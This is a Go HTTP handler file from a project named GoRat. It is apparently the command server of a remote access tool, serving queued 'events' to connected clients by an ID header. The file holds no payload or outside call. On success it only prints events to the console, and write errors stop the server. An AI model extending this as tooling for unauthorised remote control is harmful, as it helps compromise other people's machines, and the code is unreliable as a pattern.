package endpoints

import (
	"encoding/json"
	"fmt"
	"net/http"

	"github.com/NotKatsu/GoRat/modules/database"

	"github.com/pterm/pterm"
)

func EventsGet(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		customID := r.Header.Get("ID")

		if customID == "" || database.GetConnectionData(customID) == "" {
			invalidIDError := Error{
				ErrorCode:    http.StatusUnauthorized,
				ErrorMessage: "Data could not be retrived as ID is not valid.",
			}
			w.WriteHeader(http.StatusUnauthorized)

			invalidIDErrorJson, err := json.Marshal(invalidIDError)

			if err != nil {
				pterm.Fatal.WithFatal(true).Println(err)
			} else {
				_, err := w.Write(invalidIDErrorJson)

				if err != nil {
					pterm.Fatal.WithFatal(true).Println(err)
				}
			}
		} else {
			EventsFoundArray := database.GetClientEvents(customID)

			if len(EventsFoundArray) == 0 {
				ErrorReturnStruct := Error{
					ErrorCode:    http.StatusForbidden,
					ErrorMessage: "There is no events for the client, please try again later.",
				}
				w.WriteHeader(http.StatusForbidden)

				ErrorReturnStructMarshal, err := json.Marshal(ErrorReturnStruct)

				if err != nil {
					pterm.Fatal.WithFatal(true).Println(err)
				} else {
					_, err := w.Write(ErrorReturnStructMarshal)

					if err != nil {
						pterm.Fatal.WithFatal(true).Println(err)
					}
				}
			} else {
				clientEventsArray := database.GetClientEvents(customID)

				fmt.Println(clientEventsArray)
			}
		}

	} else {
		wrongMethodError := Error{
			ErrorCode:    http.StatusMethodNotAllowed,
			ErrorMessage: "GET is the only accepted Method for this endpoint.",
		}
		w.WriteHeader(http.StatusMethodNotAllowed)

		wrongMethodErrorJson, err := json.Marshal(wrongMethodError)

		if err != nil {
			pterm.Fatal.WithFatal(true).Println(err)
		} else {
			_, err := w.Write(wrongMethodErrorJson)

			if err != nil {
				pterm.Fatal.WithFatal(true).Println(err)
			}
		}
	}
}
